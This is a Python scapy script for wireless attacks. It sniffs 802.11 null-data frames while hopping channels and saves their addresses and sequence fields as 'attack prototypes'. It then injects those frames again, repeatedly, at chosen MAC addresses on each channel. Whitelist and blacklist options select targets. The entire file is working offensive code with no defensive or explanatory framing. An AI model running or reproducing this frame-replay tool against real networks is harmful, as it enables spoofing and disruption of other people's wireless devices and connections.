import re
import argparse
import os
import subprocess
import random
import threading
import time
from scapy.all import *

black_list = []
white_list = []
channel_list = list(range(1,15))
freq_dict = {}

monitor_timer = 5
outfile = None

def parseframe(frame):
	if frame.haslayer(Dot11):
		#NUL frames (sent to victim)
		if frame.getlayer(Dot11).type == 0x2 and frame.getlayer(Dot11).subtype == 0x4:
			if black_list and frame.getlayer(Dot11).addr1 in black_list:
				return
			if white_list and not str(frame.getlayer(Dot11).addr1) in white_list:
				return
			print('NUL', frame.getlayer(Dot11).addr2, 
					frame.getlayer(Dot11).addr1,
					frame.getlayer(RadioTap).dBm_AntSignal,
					frame.getlayer(RadioTap).ChannelFlags,
					frame.getlayer(RadioTap).ChannelFrequency,
					frame.getlayer(RadioTap).timestamp)
			d = frame.getlayer(Dot11)
			with open(outfile, 'a') as f:
				f.write(' '.join(
						[str(x) for x in
						[freq_dict[frame.getlayer(RadioTap).ChannelFrequency],
						d.addr1,
						d.addr2,
						d.addr3,
						d.type,
						d.subtype,
						d.FCfield.value,
						d.ID,
						d.SC]])
						+ '\n'
					)

def attack_withprotos(infile, dwell_count):
	attack_dict = {}
	with open(infile, 'r') as f:
		for line in f.readlines():
			l = line.strip().split(' ')
			if not l[0] in attack_dict:
				attack_dict[l[0]] = []
			attack_dict[l[0]].append(l[1:])

	for channel in attack_dict:
		os.system('iwconfig {} channel {}'.format(interface, channel))
		for i in attack_dict[channel]:
			if black_list and (i[0] in black_list or i[1] in black_list or i[2] in black_list):
				continue
			if white_list and not (i[0] in white_list or i[1] in white_list or i[2] in white_list):
				continue
			t = RadioTap()/Dot11(addr1=i[0], addr2=i[1], addr3=i[2], type=int(i[3]), subtype=int(i[4]), 
										FCfield=int(i[5]), ID=int(i[6]), SC=int(i[7]))
			print('Sending {} frames to {}'.format(dwell_count, i[0]))
			for i in range(0, dwell_count):
				sendp(t, iface=interface, verbose=False)

def channelhop():
	print(channel_list)
	while (True):
		random.shuffle(channel_list)
		for i in channel_list:
			print('MONITORING CHANNEL {}'.format(i))
			os.system('iwconfig {} channel {}'.format(interface, i))
			#print('iwconfig wlan0mon channel {}'.format(i))
			time.sleep(monitor_timer)

def get_freqs():
	a = subprocess.check_output(['iwlist', interface, 'channel'])
	chans = re.findall(b'Channel (\\d+) : (\d\.\d+) GHz', a)
	r = [[int(float(x[1])*1000), int(x[0])] for x in chans]
	for c in r:
		freq_dict[c[0]] = c[1]

if __name__ == '__main__':
	parser = argparse.ArgumentParser()
	parser.add_argument('-l', '--listen', action='store_true', default=False, help='Record prototypes for future attacks')
	parser.add_argument('-c', '--channels', nargs='+', default=channel_list, help='Channels to monitor')
	parser.add_argument('-i', '--interface', default='wlan0mon', help='Interface to monitor')
	parser.add_argument('-b', '--blacklist', nargs='+', default=[], help='Blacklist of mac addresses to avoid targeting')
	parser.add_argument('-w', '--whitelist', nargs='+', default=[], help='Whitelist of mac addresses to target')
	parser.add_argument('-t', '--time', default=monitor_timer, type=int, help='Time to monitor a channel before switching')
	parser.add_argument('-o', '--outfile', default='./replay.out', help='Output file for recording')

	parser.add_argument('-r', '--replay', help='Input file of attack prototypes')
	parser.add_argument('-d', '--dwell', default=10, type=int, help='Number of times to send an attack')

	args = parser.parse_args()

	
	channel_list = args.channels
	interface = args.interface
	black_list = [x.lower() for x in args.blacklist]
	white_list = [x.lower() for x in args.whitelist]
	monitor_timer = args.time
	outfile = args.outfile

	get_freqs()

	if args.replay:
		attack_withprotos(args.replay, args.dwell)
	elif args.listen:
		thread = threading.Thread(target=channelhop, name="Hop")
		thread.daemon = True
		thread.start()

		sniff(iface=interface, prn=parseframe, store=0)